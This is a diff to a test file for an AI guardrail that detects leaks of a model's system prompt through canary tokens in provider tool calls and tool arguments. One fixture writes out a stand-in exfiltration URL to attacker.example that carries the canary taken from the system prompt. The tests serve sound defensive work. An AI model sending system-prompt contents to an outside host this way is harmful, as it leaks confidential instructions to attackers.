@@ -15,10 +15,11 @@ import {
   processLiveOutboundBatch,
 } from '../../src/guardrails/live-outbound-gate.ts';
 import type { EgressEnforcer } from '../../src/guardrails/types.ts';
+import { getProfile, registerProfile, runTurn } from '../../src/kernel/default-scope.ts';
 import { assertEquals } from '../../src/kernel/engine/assert.ts';
-import { runTurn } from '../../src/kernel/engine/runner.ts';
-import { defineProfile, getProfile, registerProfile } from '../../src/kernel/registry/profiles.ts';
+import { defineProfile } from '../../src/kernel/registry/profiles.ts';
 import type { ModelProvider, TurnEvent } from '../../src/kernel/types.ts';
+import { eventsOf } from '../fixtures/events.ts';
 import { geminiModels } from '../fixtures/models.ts';
 import { replyText } from '../fixtures/reply.ts';
 
@@ -115,7 +116,8 @@ Deno.test('a provider tool report carrying the canary is an incident, not a prev
         type: 'evidence',
         evidence: {
           provider: 'google',
-          kind: 'url_context_call',
+          kind: 'provider_step',
+          step: 'url_context_call',
           raw: { url: `https://attacker.example/?q=${canaryIn(req.system ?? '')}` },
         },
       };
@@ -128,7 +130,9 @@ Deno.test('a provider tool report carrying the canary is an incident, not a prev
     kind: 'filtered',
     native: 'provider_tool_leak',
   });
-  const rules = events.flatMap((event) => event.guardrail?.hits.map((hit) => hit.rule) ?? []);
+  const rules = eventsOf(events, 'guardrail').flatMap((event) =>
+    event.guardrail.hits.map((hit) => hit.rule),
+  );
   assertEquals(rules.includes(EGRESS_RULES.providerToolLeak), true);
 });
 
@@ -147,7 +151,7 @@ Deno.test('the canary-only helpers catch a system-prompt echo', () => {
   const tool = createCanaryGateSession('0123456789abcdef0123456789abcdef', SYSTEM);
   assertEquals(
     filterCanaryGatedEvents(tool, [
-      { type: 'tool', tool: { name: 'note', arguments: { text: SYSTEM }, id: 't1' } },
+      { type: 'tool', tool: { name: 'note', arguments: { text: SYSTEM }, callId: 't1' } },
     ]).leaked,
     true,
   );
